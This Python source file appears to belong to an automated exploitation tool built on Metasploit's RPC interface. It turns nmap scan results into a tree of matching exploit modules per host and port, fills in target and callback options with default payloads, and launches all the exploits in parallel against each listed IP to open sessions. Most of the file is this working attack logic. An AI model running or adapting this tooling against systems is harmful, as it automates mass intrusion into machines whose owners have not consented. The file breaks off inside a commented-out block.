from json_data_processing_script import *
from metasploit_script import *
import os
import socket
import multiprocessing
import random


class Blackhat:
    def __init__(self):

        ######################IF LAUNCH THROUGH GRAPHIC INTERFACE, THEN RELOCATE OS POINTER###################
        try:
            os.chdir('dashboard/static/script/')
            self.flag_relocate = True
        except Exception:
            pass

        self.json_monitor = Json_monitor()
        self.env = Msfrpc()
        self.targets_tree = self.json_monitor.get_targets_tree()

        ######################PRINT BANNER#####################################################################
        self.env.color_monitor.print_intro_banner()

        ######################CONNECT YOURSELF TO MSGRPC#######################################################
        self.flag_connection_error = None
        self.env.launch_metasploit()
        try:
            self.env.connection_rpc()
        except Exception as e:
            self.flag_connection_error = -1
        ######################STORE INFORMATIONS###############################################################
        self.tree_targets = None
        self.default_tree_payload_per_exploit = None
        self.targets_option_tree_per_exploit = None
        self.current_targets_option_tree = None
        self.checkmodule_option_tree_per_exploit = None
        self.host_ip = None
        self.lport_for_exploit_execution = 50000
        self.id_storage_for_exploit_execution = []
        self.flag_relocate = None

        ######################MULTIPROCESS INITIALIZER########################################################
        # self.lock = multiprocessing.Lock()

    ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################
    #                ________
    #           _,.-Y  |  |  Y-._
    #       .-~"   ||  |  |  |   "-.
    #       I" ""=="|" !""! "|"[]""|     _____
    #       L__  [] |..------|:   _[----I" .-{"-.
    #      I___|  ..| l______|l_ [__L]_[I_/r(=}=-P
    #     [L______L_[________]______j~  '-=c_]/=-^
    #      \_I_j.--.\==I|I==_/.--L_]
    #        [_((==)[`-----"](==)j
    #           I--I"~~"""~~"I--I
    #           |[]|         |[]|
    #           l__j         l__j
    #           |!!|         |!!|
    #           |..|         |..|
    #           ([])         ([])
    #           ]--[         ]--[
    #           [_L]         [_L]  -Row  (the Ascii-Wizard of Oz)
    #          /|..|\       /|..|\
    #         `=}--{='     `=}--{='
    #        .-^--r-^-.   .-^--r-^-.
    # ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    ####################SUB FUNCTION TO HANDLE CORRECTION AND OPTIMIZATION####################################

    def correction_with_correlation_table_for_service_name(self, service_name):
        '''
        Method used to make correlation between value given in entry of the method and the table defined in config.ini
        :param service_name: name of the service (string)
        :return: the correlation (string)
        '''
        for correlation in self.json_monitor.correlation_table_services:
            if service_name in correlation:
                msfcorrector = correlation.split('$')[-1]
                return msfcorrector
        return service_name

    def correction_with_detection_service_name(self, service_name):
        '''
        Method used to make a correction of the service_name if it has some ascii character like '-' which could lead to
        a bad research of msfconsole
        :param service_name: name of the service (string)
        :return: the correction (string)
        '''
        if '-' in service_name:
            service_name = service_name.split('-')
            for item in service_name:
                if item in self.json_monitor.service_list:
                    service_name = item
                    return service_name
            service_name = service_name[0]
        return service_name

    def correction_with_correlation_table_for_targets_option(self, target_name):
        '''
        Method used to make correlation between value given in entry of the method and the table defined in config.ini
        :param target_name: name of the target (string)
        :return: the correlation (string)
        '''
        for correlation in self.json_monitor.correlation_table_targets:
            if target_name in correlation:
                msfcorrector = correlation.split('$')[-1]
                return msfcorrector
        return target_name

    def look_for_repository(self, exploit):
        '''
        Method used to check if there is a directory related to the current exploit
        :param list_of_item: list of the item retrieved from the console
        :return: a specific repository according to the given exploit previously entered in the search command of the console
        '''
        for item in self.json_monitor.exploits_directory:
            if item == exploit:
                return 1
        return 0

    ####################SCAVENGER PROCESS FOR EXPLOITATION####################################################
    #  _______             _______
    # |@|@|@|@|           |@|@|@|@|
    # |@|@|@|@|   _____   |@|@|@|@|
    # |@|@|@|@| /\_T_T_/\ |@|@|@|@|
    # |@|@|@|@||/\ T T /\||@|@|@|@|
    #  ~/T~~T~||~\/~T~\/~||~T~~T\~
    #   \|__|_| \(-(O)-)/ |_|__|/
    #   _| _|    \\8_8//    |_ |_
    # |(@)]   /~~[_____]~~\   [(@)|
    #   ~    (  |       |  )    ~
    #       [~` ]       [ '~]
    #       |~~|         |~~|
    #       |  |         |  |
    #      _<\/>_       _<\/>_
    #     /_====_\     /_====_\
    ####################SCAVENGER PROCESS FOR EXPLOITATION####################################################

    def get_default_payload_per_exploit_tree(self):
        '''
        Method used to create the tree for payload (per exploit)
        :return:
        '''
        ####GET THE DEFAULT LIST######
        self.env.get_exploits()
        self.env.get_default_payload()
        ####STORE IT##################
        self.default_tree_payload_per_exploit = self.env.default_list_payload_per_exploit

        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
            str(self.json_monitor.datapath) + '/default_payload_tree.json') +
              self.env.color_monitor.background_ENDC)

        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/default_payload_tree.json',
                                                    self.default_tree_payload_per_exploit)

    def get_targets_per_exploit_tree(self):
        '''
        Method used to create the tree for targets (per exploit)
        :return:
        '''
        ####GET THE TREE####
        self.env.get_exploits()
        self.env.get_targets_exploit()
        ####STORE IT########
        self.targets_option_tree_per_exploit = self.env.targets_list_per_exploit

        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
            str(self.json_monitor.datapath) + '/targets_option_tree.json') +
              self.env.color_monitor.background_ENDC)

        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/targets_option_tree.json',
                                                    self.targets_option_tree_per_exploit)

    def get_default_checkmodule_per_exploit_tree(self):
        '''
        Method used to create the tree for checkmodule (per exploit)
        This method is necessary due to the bad configuration of pymetasploit3
        :return:
        '''
        ####GET THE TREE####
        self.env.get_exploits()
        self.env.get_checkmodule_exploit()
        ####STORE IT########
        self.checkmodule_option_tree_per_exploit = self.env.checkmodule_list_per_exploit

        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
            str(self.json_monitor.datapath) + '/default_checkmodule_tree.json') +
              self.env.color_monitor.background_ENDC)

        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/default_checkmodule_tree.json',
                                                    self.checkmodule_option_tree_per_exploit)

    def get_targets_option_for_target_per_exploit(self, ip):
        '''
        Method used to create the tree of targets_option for the target (per exploit)
        :return:
        '''
        ###INITIALISATION OF THE NEW TREE###
        tree_targets_option_for_target = {}
        ###RETRIEVE THE TREE####
        tree_targets_option = self.json_monitor.read_json_data_in_a_file(
            self.json_monitor.datapath + '/targets_option_tree.json')
        tree_target = self.json_monitor.read_json_data_in_a_file(self.json_monitor.datapath + '/targets_tree.json')
        ###RETRIEVE OS OF THE VICTIM###
        os = tree_target[str(ip)]["os"]
        ###CHECK IF CORRELATION EXIST AND IF TRUE STORE IT IN THE LIST###
        tmp = []
        tmp.append(os)
        correlation = self.correction_with_correlation_table_for_targets_option(os)
        if os != correlation:
            tmp.append(correlation)
        ###LOOK FOR THE OS AND MAKE THE TREE FOR THE SPECIFIC TARGET RELATED TO THE IP###
        ###CHECK IF AUTO, GENERIC TARGET IS IN THE LIST###
        for exploit, targets_option in tree_targets_option.items():
            target_selected = []
            for target_name in targets_option:
                if 'automatic' in target_name.lower():
                    target_selected.append(target_name)
                if 'generic' in target_name.lower():
                    target_selected.append(target_name)
            ###IF NO AUTO MOD FOUND, LOOK FOR THE OS OF TARGET###
            if len(target_selected) == 0:
                for target_name in targets_option:
                    for os_name in tmp:
                        if os_name in target_name.lower():
                            target_selected.append(target_name)
            ###IF NONE OF THE PREVIOUS METHOD WORKED, RETRIEVE ALL EXPLOIT###
            if len(target_selected) == 0:
                target_selected = targets_option
            ###DELETE DOUBLE VALUE DUE TO CORRELATION###
            target_selected = list(dict.fromkeys(target_selected))
            ###STORE IT IN THE DICT###
            tree_targets_option_for_target[str(exploit)] = target_selected

        ###STORE IN JSON FILE###
        self.current_targets_option_tree = tree_targets_option_for_target

        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
            str(self.json_monitor.datapath) + '/targets_option_tree_for_' + str(ip) + '.json') +
              self.env.color_monitor.background_ENDC)

        self.json_monitor.write_json_data_in_a_file(
            self.json_monitor.datapath + '/targets_option_tree_for_' + str(ip) + '.json',
            self.current_targets_option_tree)

    def get_targets_tree(self):
        '''
        Methode used to create the exploit tree
        :return: nothing (the result is stored in self.targets_tree)
        '''
        ##########################################USE THE MSFCONSOLE TO RETRIEVE THE EXPLOIT###################
        print(
            self.env.color_monitor.background_OKGREEN + "[*] Beginning of the creation of the targets' tree" +
            self.env.color_monitor.background_ENDC)
        #                  ______
        #                 /     /\
        #                /     /##\
        #               /     /####\
        #              /     /######\
        #             /     /########\
        #            /     /##########\
        #           /     /#####/\#####\
        #          /     /#####/++\#####\
        #         /     /#####/++++\#####\
        #        /     /#####/\+++++\#####\
        #       /     /#####/  \+++++\#####\
        #      /     /#####/    \+++++\#####\
        #     /     /#####/      \+++++\#####\
        #    /     /#####/        \+++++\#####\
        #   /     /#####/__________\+++++\#####\
        #  /                        \+++++\#####\
        # /__________________________\+++++\####/
        # \+++++++++++++++++++++++++++++++++\##/
        #  \+++++++++++++++++++++++++++++++++\/
        #   ``````````````````````````````````
        dict_of_targets = {}
        dict_of_target = {}
        dict_of_target_port = {}
        for ip, dict_of_ip in self.targets_tree.items():
            for item_name, dict_of_a_spe_ip in dict_of_ip.items():
                if item_name == 'ports':
                    for port, dict_of_port in dict_of_a_spe_ip.items():
                        search_string_for_console_cmd = ''
                        if dict_of_port['prod_name'] != 'unknown':
                            ######################################PRINT#################################################
                            print(
                                self.env.color_monitor.background_OKGREEN + "[*] Retrieving informations from the port {} associated with the service {}".format(
                                    str(port), str(dict_of_port['prod_name'])) +
                                self.env.color_monitor.background_ENDC)
                            ############################################################################################
                            search_string_for_console_cmd = self.correction_with_detection_service_name(
                                dict_of_port['prod_name'])
                            search_string_for_console_cmd = self.correction_with_correlation_table_for_service_name(
                                search_string_for_console_cmd)

                            prod_name_corrected = search_string_for_console_cmd
                            version_troncated = ''
                            if dict_of_port['version'] != 'unknown':
                                try:
                                    version_troncated = dict_of_port['version'].split('.')[0]
                                    a = int(version_troncated)
                                except:
                                    version_troncated = ''

                            search_string_for_console_cmd += ' ' + version_troncated
                            search_string_for_console_cmd = 'search ' + search_string_for_console_cmd
                            #############################LAUNCH THE COMMAND SEARCH IN MSF AND GET LIST EXPLOIT##########
                            exploit_list = self.env.execute_console_command(search_string_for_console_cmd)[
                                'data'].split('\n')
                            tmp = []
                            for item in exploit_list:
                                if 'exploit' in item:
                                    tmp.append(item)
                            exploit_list = tmp
                            tmp = []
                            #####################LOOK IF A REPOSITORY OF THE SEARCH EXISTS IN MSFDATABASE###############
                            flag_repository = self.look_for_repository(prod_name_corrected)
                            #####################CREATE THE LIST ACCORDING TO THE PREVIOUS RESULT#######################
                            ###DIRECORY EXISTS
                            if flag_repository == 1:
                                for item in exploit_list:
                                    for item_sub in item.split(' '):
                                        if prod_name_corrected in item_sub and 'exploit' in item_sub:
                                            if prod_name_corrected == item_sub.split('/')[2] and (
                                                    dict_of_ip['os'] in item_sub or 'multi' in item_sub):
                                                tmp.append(item_sub)
                                exploit_list = tmp
                                tmp = []
                            ###RANKED METHOD
                            else:
                                for item in exploit_list:
                                    if 'excellent' in item or 'great' in item or 'good' in item:
                                        for item_sub in item.split(' '):
                                            # TODO addd correlation linux and unix
                                            if dict_of_ip['os'] == 'unix' or dict_of_ip['os'] == 'linux':
                                                if 'exploit' in item_sub and (
                                                        'linux' in item_sub or 'multi' in item_sub or 'unix' in item_sub):
                                                    tmp.append(item_sub)
                                            ######################################
                                            else :
                                                if 'exploit' in item_sub and (
                                                        dict_of_ip['os'] in item_sub or 'multi' in item_sub):
                                                    tmp.append(item_sub)
                                exploit_list = tmp
                                tmp = []

                            ##################CREATE THE DICT OF THE PORT AND STORE IT##################################
                            dict_of_target_port['prod_name'] = prod_name_corrected
                            dict_of_target_port['version'] = dict_of_port['version']
                            dict_of_target_port['protocol'] = dict_of_port['protocol']
                            dict_of_target_port['exploit'] = exploit_list

                            dict_of_target[str(port)] = dict_of_target_port
                            dict_of_target_port = {}

                        else:
                            ######################################PRINT#################################################
                            print(
                                self.env.color_monitor.background_FAIL + "[x] No information to retrieve from the port {} ".format(
                                    str(port)) +
                                self.env.color_monitor.background_ENDC)
                            ############################################################################################

                            dict_of_target_port['prod_name'] = dict_of_port['prod_name']
                            dict_of_target_port['version'] = dict_of_port['version']
                            dict_of_target_port['protocol'] = dict_of_port['protocol']
                            dict_of_target_port['exploit'] = []

                            dict_of_target[str(port)] = dict_of_target_port
                            dict_of_target_port = {}

            ######################STORE THE WHOLE INFORMATION IN A DIC OF TARGETS#######################################
            dict_of_targets[str(ip)] = {'os': dict_of_ip['os'], 'ports': dict_of_target}
            print(
                self.env.color_monitor.background_OKGREEN + "[*] Success in creating the json of the targets' tree" + self.env.color_monitor.background_ENDC)
        ##########################STORE INFORATIONS IN THE CLASS ITSELF#################################################
        self.targets_tree = dict_of_targets
        #                       ug
        #                      b
        #                     g           bug
        #                     u        bug
        #     bugbug          b       g
        #           bug      bugbug bu
        #              bug  bugbugbugbugbugbug
        # bug   bug   bugbugbugbugbugbugbugbugb
        #    bug   bug bugbugbugbugbugbugbugbugbu
        #  bugbugbugbu gbugbugbugbugbugbugbugbugbu
        # bugbugbugbug
        #  bugbugbugbu gbugbugbugbugbugbugbugbugbu
        #    bug   bug bugbugbugbugbugbugbugbugbu
        # bug   bug  gbugbugbugbugbugbugbugbugb
        #              bug  bugbugbugbugbugbug
        #           bug      bugbug  bu
        #     bugbug          b        g
        #                     u         bug
        #                     g            bug
        #                      b
        #                       ug
        print(self.env.color_monitor.background_OKGREEN + "[*] Storing information in {}".format(
            str(self.json_monitor.datapath) + '/targets_tree.json') +
              self.env.color_monitor.background_ENDC)
        self.json_monitor.write_json_data_in_a_file(self.json_monitor.datapath + '/targets_tree.json',
                                                    self.targets_tree)

    def get_existence_ia_ressources_data(self):
        '''
        Method used to check if the ia ressources about previous training exist
        :return:
        '''
        if os.path.exists(
                os.path.join(self.json_monitor.save_path_ia_data, self.json_monitor.save_ia_data_file)) is True:
            return True
        else:
            return False

    def get_host_ip(self, ip_target):
        '''
        Method used to get the ip of the host
        :return:
        '''
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((ip_target, 80))
        self.host_ip = s.getsockname()[0]
        s.close()

    ######################################EXPLOITATION PROCESS################################################
    #                              888          ,e,   d8
    #  e88~~8e  Y88b  /  888-~88e  888  e88~-_   "  _d88__
    # d888  88b  Y88b/   888  888b 888 d888   i 888  888
    # 8888__888   Y88b   888  8888 888 8888   | 888  888
    # Y888    ,   /Y88b  888  888P 888 Y888   ' 888  888
    #  "88___/   /  Y88b 888-_88"  888  "88_-~  888  "88_/
    #                    888
    ######################################EXPLOITATION PROCESS################################################

    def executor_agent_configuration_and_launch_exploit(self, ip, port_number, exploit, flag_ia_data_load=None):
        '''
        Executor agent created for multiprocessing in exploit execution
        :param ip: ip of the target (string)
        :param port_number: number of the port associated with the following exploit (string)
        :param exploit: exploit (string)
        :param flag_ia_data_load: flag which indicate if ia data is load (string)
        :return:
        '''
        ###GENERAL VARIABLE###
        flag_rport_default_value_changed = None
        ###FOR LPORT, CHOOSE A NUMBER BETWEEN 1-10000, STORE IT, AND IF IT IS ALREADY STORED CHOOSE AN OTHER ONE###
        id = random.randint(1, 10000)  # choose an id
        tmp_time_wait = random.randint(0,
                                       3)  # create different time wait (not too long in oder to not impact benchmark) whose goal is to reduce collision probability
        while id in self.id_storage_for_exploit_execution:
            id = random.randint(1, 10000)
            time.sleep(tmp_time_wait)
        self.id_storage_for_exploit_execution.append(id)
        ######################
        ###GET LOCK###
        # self.lock.acquire()
        ##############
        ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
        self.env.run_an_exploit(exploit)

        try:
            ###RETRIEVE THE REQUIRED MISSING OPTIONS###
            for options in self.env.current_exploit.missing_required:
                flag_check = None
                if options.lower() == 'checkmodule':
                    ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
                    flag_check = self.env.change_option_exploit('CheckModule',
                                                                self.checkmodule_option_tree_per_exploit[
                                                                    '/'.join(
                                                                        self.env.current_exploit.fullname.split(
                                                                            '/')[1:])], 'STR')
                if options.lower() == 'rhosts':
                    ###SET RHOSTS ACCORDING TO THE TARGET TREE###
                    flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')

                if options.lower() == 'rhost':
                    ###SET RHOST ACCORDING TO THE TARGET TREE###
                    flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')

                if options.lower() == 'rport':
                    ###SET RPORT ACCORDING TO THE TARGET TREE###
                    flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
                    flag_rport_default_value_changed = 1

                elif flag_check is None:
                    raise Exception("Can't configure correctly the exploit : unknown required option")

            if "SRVPORT" in self.env.current_exploit.options:
                server_port_tmp = (self.lport_for_exploit_execution - 10000) + int(id)
                flag_check = self.env.change_option_exploit('SRVPORT', str(server_port_tmp), 'INT')

        except Exception as e:
            print(self.env.color_monitor.background_FAIL +
                  '[x] Failed to configure exploit {} : {}'.format(str(exploit),
                                                                   str(e)),
                  self.env.color_monitor.background_ENDC)
        # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #

        # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
        if flag_ia_data_load is None:
            try:
                ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
                # remove the beginning 'exploit/'
                self.env.run_a_payload(self.default_tree_payload_per_exploit[
                                           str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))])
                ###CONFIGURE IT###
                self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
                ###LOAD THE PORT ACCORDING TO THE CONF TO AVOID "UNBIND PROCESS ERROR"###
                tmp_lport_for_exploit_execution = self.lport_for_exploit_execution + int(id)
                self.env.change_option_payload('LPORT', str(tmp_lport_for_exploit_execution), 'INT')
                # self.lock.release()
            except Exception as e:
                print(self.env.color_monitor.background_FAIL +
                      '[x] Failed to configure payload for exploit {} : {}'.format(str(exploit),
                                                                                   str(e)),
                      self.env.color_monitor.background_ENDC)

        else:
            # TODO
            '''
            use IA weight data to determine payload
            '''
            a = None
        # ----------------------------------------END PAYLOAD CONF------------------------------------ #

        # --------------------------------TARGETS CONF (EXPLOIT CONF PART 2)-------------------------- #
        ###RETRIEVE TARGETS LIST RELATED TO THE EXPLOIT AND THE OS OF THE VICTIM###
        target_list = self.current_targets_option_tree[str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]

        for target in target_list:
            try:
                ###GET THE INDEX###
                index = self.targets_option_tree_per_exploit[
                    str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))].index(
                    str(target))
                ###################
                self.env.current_exploit.target = index
                ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
                json_exploit, session = self.env.execute_exploit()
                if json_exploit == -1:
                    print(self.env.color_monitor.background_FAIL +
                          '[x] Failed to launch exploit with target {}'.format(str(index)),
                          self.env.color_monitor.background_ENDC)
                else:
                    try:
                        print(self.env.color_monitor.background_HEADER +
                              '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
                                  str(exploit),
                                  str(self.default_tree_payload_per_exploit[
                                          str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]),
                                  str(target),
                                  str(ip),
                                  str(self.env.current_exploit.runoptions['RPORT'])
                              ),
                              self.env.color_monitor.background_ENDC)
                    except Exception:
                        print(self.env.color_monitor.background_HEADER +
                              '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
                                  str(exploit),
                                  str(self.default_tree_payload_per_exploit[
                                          str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))]),
                                  str(target),
                                  str(ip),
                                  str(port_number)
                              ),
                              self.env.color_monitor.background_ENDC)
                    break
                # ----------------------------------END EXECUTE EXPLOIT------------------------------- #

                if flag_rport_default_value_changed is None and json_exploit == -1:
                    ###CHANGE RPORT AND RETRY THE SAME PROCESS WITH TARGET OPTION, EXECPT IF RPORT DEFAULT IS RPORT TREE###
                    try:
                        if str(port_number) == str(self.env.current_exploit.runoptions['RPORT']):
                            raise Exception("RPORT default and RPORT in the target tree are the same")
                        #######################################################################################################
                        #######CHANGE RPORT######
                        flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
                        #########################
                        ###IF RPORT NOT CHANGEABLE###
                        if flag_check is None:
                            raise Exception("RPORT not changeable ")
                    except Exception:
                        raise Exception("RPORT not changeable")
                    #############################
                    ###DISPLAY INFO###
                    print(
                        self.env.color_monitor.background_OKCYAN + "[*] Trying to run exploit by changing RPORT : {}".format(
                            str(port_number)))
                    ##################
                    for target in target_list:
                        ###GET THE INDEX###
                        index = self.targets_option_tree_per_exploit[
                            str('/'.join(self.env.current_exploit.fullname.split('/')[1:]))].index(
                            str(target))
                        ###################
                        self.env.current_exploit.target = index
                        ###EXECUTE THE EXPLOIT###------------------------------------------------------------- #
                        json_exploit, session = self.env.execute_exploit()
                        if json_exploit == -1:
                            print(self.env.color_monitor.background_FAIL +
                                  '[x] Failed to get session with exploit\'s target {}'.format(
                                      str(index)),
                                  self.env.color_monitor.background_ENDC)
                        else:
                            print(self.env.color_monitor.background_OKGREEN +
                                  '[*] Success in using the exploit {} with the payload {} and the target {}, to the target ip {}, at the port {}'.format(
                                      str(exploit),
                                      str(self.default_tree_payload_per_exploit[str(exploit)]),
                                      str(target),
                                      str(ip),
                                      str(port_number)
                                  ),
                                  self.env.color_monitor.background_ENDC)
                            break
                    # ----------------------------------END EXECUTE EXPLOIT------------------------------- #

            except Exception as e:
                print(self.env.color_monitor.background_FAIL +
                      '[x] Failed to launch the exploitation : {}'.format(str(e)),
                      self.env.color_monitor.background_ENDC)
        # self.lock.release()

    def launch_exploitation(self, mode):
        '''
        Method use to launch a massive exploitation of target, according to the data implemented in the target tree
        :param mode: 'test' : mode used to use IA data and to exploit victim's machine failures
                     'train' : mode used to train IA and to improve IA data
        :return: the sessions created or None if there isn't one
        '''
        ###GENERAL VARIABLE###
        tic = time.time()
        flag_ia_data_load = None
        pool = multiprocessing.Pool(processes=20)  # 20 simultaneous process
        ######################
        ###CHECK CONNECTION###
        if self.flag_connection_error == -1:
            return None
        ######################
        if mode == "train":
            # TODO
            '''
            create mode train
            '''
            a = None
        elif mode == "test":
            if self.get_existence_ia_ressources_data() is True:
                # TODO
                '''
                load weight when IA will exist
                '''
                a = None
                flag_ia_data_load = 1
            # -------------------------------------------------BEGIN TREE--------------------------------------------- #

            ###RETRIEVE THE TARGET TREE IF ALREADY STORED###
            # targets tree might not be None due to the fact that it serves also for the old tree target (retrieve from nmap scan)
            if os.path.exists(os.path.join(self.json_monitor.datapath, 'targets_tree.json')) is True:
                self.targets_tree = self.json_monitor.read_json_data_in_a_file(
                    self.json_monitor.datapath + '/targets_tree.json')
                print(
                    self.env.color_monitor.background_OKCYAN + "[*] Retrieve the targets tree : {}".format(
                        self.json_monitor.datapath + '/targets_tree.json') +
                    self.env.color_monitor.background_ENDC
                )
            else:
                print(
                    self.env.color_monitor.background_WARNING + "[!!!] No target tree were found, creating it based on"
                                                                " last nmap scan launched via HacktoolBox interfaces" +
                    self.env.color_monitor.background_ENDC)
                self.get_targets_tree()
            ###RETRIEVE THE PAYLOAD TREE IF ALREADY STORED###
            if self.default_tree_payload_per_exploit is None:
                if os.path.exists(os.path.join(self.json_monitor.datapath, 'default_payload_tree.json')) is True:
                    self.default_tree_payload_per_exploit = self.json_monitor.read_json_data_in_a_file(
                        self.json_monitor.datapath +
                        '/default_payload_tree.json')
                    print(
                        self.env.color_monitor.background_OKCYAN + "[*] Retrieve the default payload tree : {}".format(
                            self.json_monitor.datapath + '/default_payload_tree.json') +
                        self.env.color_monitor.background_ENDC
                    )
                else:
                    print(self.env.color_monitor.background_WARNING +
                          '[!!!] No default payload tree was found, creation of this feature is launched' +
                          self.env.color_monitor.background_ENDC)
                    self.get_default_payload_per_exploit_tree()
            ###RETRIEVE THE CHECKMODULE TREE IF ALREADY STORED###
            if self.checkmodule_option_tree_per_exploit is None:
                if os.path.exists(os.path.join(self.json_monitor.datapath, 'default_checkmodule_tree.json')) is True:
                    self.checkmodule_option_tree_per_exploit = self.json_monitor.read_json_data_in_a_file(
                        self.json_monitor.datapath +
                        '/default_checkmodule_tree.json')
                    print(
                        self.env.color_monitor.background_OKCYAN + "[*] Retrieve the default checkmodule tree : {}".format(
                            self.json_monitor.datapath + '/default_checkmodule_tree.json') +
                        self.env.color_monitor.background_ENDC
                    )
                else:
                    print(self.env.color_monitor.background_WARNING +
                          '[!!!] No default checkmodule tree was found, creation of this feature is launched' +
                          self.env.color_monitor.background_ENDC)
                    self.get_default_checkmodule_per_exploit_tree()
            ###RETRIEVE THE GENERAL TARGETS OPTION TREE###
            if self.targets_option_tree_per_exploit is None:
                if os.path.exists(os.path.join(self.json_monitor.datapath, 'targets_option_tree.json')) is True:
                    self.targets_option_tree_per_exploit = self.json_monitor.read_json_data_in_a_file(
                        self.json_monitor.datapath +
                        '/targets_option_tree.json')
                    print(
                        self.env.color_monitor.background_OKCYAN + "[*] Retrieve the general targets option tree : {}".format(
                            self.json_monitor.datapath + '/targets_option_tree.json') +
                        self.env.color_monitor.background_ENDC
                    )
                else:
                    print(self.env.color_monitor.background_WARNING +
                          '[!!!] No targets option tree found, creation of this feature is launched' +
                          self.env.color_monitor.background_ENDC)
                    self.get_targets_per_exploit_tree()
            # -------------------------------------------------END TREE----------------------------------------------- #

            for ip in [*self.targets_tree]:
                ###DISPLAY INFO###
                # -------------------------------------------------RETRIEVE HOST IP--------------------------------------- #
                self.get_host_ip(ip)
                print(self.env.color_monitor.background_OKCYAN,
                      "--------------------------------------------------------",
                      "[*] Host ip is set : {}".format(str(self.host_ip)),
                      "--------------------------------------------------------",
                      self.env.color_monitor.background_ENDC)
                # -------------------------------------------------END HOST IP-------------------------------------------- #
                print(self.env.color_monitor.background_OKCYAN,
                      "--------------------------------------------------------",
                      "[*] Target ip is set : {}".format(str(ip)),
                      "--------------------------------------------------------",
                      self.env.color_monitor.background_ENDC)
                self.env.color_monitor.print_exploit_banner()
                ###RETRIEVE THE TARGETS OPTION TREE FOR AN IP###
                if os.path.exists(os.path.join(self.json_monitor.datapath,
                                               'targets_option_tree_for_' + str(ip) + '.json')) is True:
                    self.current_targets_option_tree = self.json_monitor.read_json_data_in_a_file(
                        self.json_monitor.datapath +
                        '/targets_option_tree_for_' + str(ip) + '.json')
                else:
                    print(self.env.color_monitor.background_WARNING +
                          '[!!!] No targets option tree found for ip {}, creation of this feature is launched'.format(
                              str(ip)) +
                          self.env.color_monitor.background_ENDC)
                    self.get_targets_option_for_target_per_exploit(str(ip))

                ###EXPLORE THE TARGET TREE###
                for port_number in [*self.targets_tree[ip]["ports"]]:
                    for exploit in self.targets_tree[ip]["ports"][port_number]["exploit"]:
                        pool.apply_async(self.executor_agent_configuration_and_launch_exploit,
                                         args=(str(ip), str(port_number), exploit, flag_ia_data_load))
                pool.close()
                pool.join()

                ######################IF LAUNCH THROUGH GRAPHIC INTERFACE, THEN RELOCATE OS POINTER###################
                if self.flag_relocate:
                    os.chdir('../../../')

                #########################################SYNCHRONE PART BELOW###########################################
                #         self.executor_agent_configuration_and_launch_exploit(str(ip), str(port_number), str(exploit),
                #                                                      flag_ia_data_load)
                # multiprocessing.Process(target=self.executor_agent_configuration_and_launch_exploit, args=(locker, str(ip), str(port_number), exploit, flag_ia_data_load)).start()

                # for exploit in self.targets_tree[ip]["ports"][port_number]["exploit"]:
                # # ---------------------------------USEFULL VARIABLE FOR THE USE OF EXPLOIT ------------------- #
                # name_exploit_for_use = str(exploit).split('/')
                # name_exploit_for_use = '/'.join(name_exploit_for_use[1:])
                # # ---------------------------------END USEFULL VARIABLE--------------------------------------- #

                ############# self.executor_agent_configuration_and_launch_exploit(str(ip), str(port_number), str(exploit), flag_ia_data_load)
                #
                # ###RUN THE EXPLOIT PART 1###------------------------------------------------------------------ #
                # self.env.run_an_exploit(exploit)
                #
                # try:
                #     ###RETRIEVE THE REQUIRED MISSING OPTIONS###
                #     for options in self.env.current_exploit.missing_required:
                #         flag_check = None
                #         if options.lower() == 'checkmodule':
                #             ###SET CHECKMODULE ACCORDING TO THE TREE OF CHECKMODULE EXPLOIT###
                #             flag_check = self.env.change_option_exploit('CheckModule',
                #                                                         self.checkmodule_option_tree_per_exploit[
                #                                                             name_exploit_for_use], 'STR')
                #         if options.lower() == 'rhosts':
                #             ###SET RHOSTS ACCORDING TO THE TARGET TREE###
                #             flag_check = self.env.change_option_exploit('RHOSTS', str(ip), 'STR')
                #
                #         if options.lower() == 'rhost':
                #             ###SET RHOST ACCORDING TO THE TARGET TREE###
                #             flag_check = self.env.change_option_exploit('RHOST', str(ip), 'STR')
                #
                #         if options.lower() == 'rport':
                #             ###SET RPORT ACCORDING TO THE TARGET TREE###
                #             flag_check = self.env.change_option_exploit('RPORT', str(port_number), 'INT')
                #             flag_rport_default_value_changed = 1
                #
                #         elif flag_check is None:
                #             raise Exception("Can't configure correctrly the exploit : unknown required option")
                # except Exception as e:
                #     print(self.env.color_monitor.background_FAIL +
                #           '[x] Failed to configure exploit {} : {}'.format(str(exploit),
                #                                                            str(e)),
                #           self.env.color_monitor.background_ENDC)
                # # ------------------------------------END CONF EXPLOIT PART 1--------------------------------- #
                #
                # # --------------------------------------BEGIN PAYLOAD CONF------------------------------------ #
                # if flag_ia_data_load is None:
                #     try:
                #         ###RETRIEVE THE DEFAULT PAYLOAD AND SELECT IT###
                #         # remove the beginning 'exploit/'
                #         self.env.run_a_payload(self.default_tree_payload_per_exploit[str(name_exploit_for_use)])
                #         ###CONFIGURE IT###
                #         self.env.change_option_payload('LHOST', str(self.host_ip), 'STR')
                #     except Exception as e:
                #         print(self.env.color_monitor.background_FAIL +
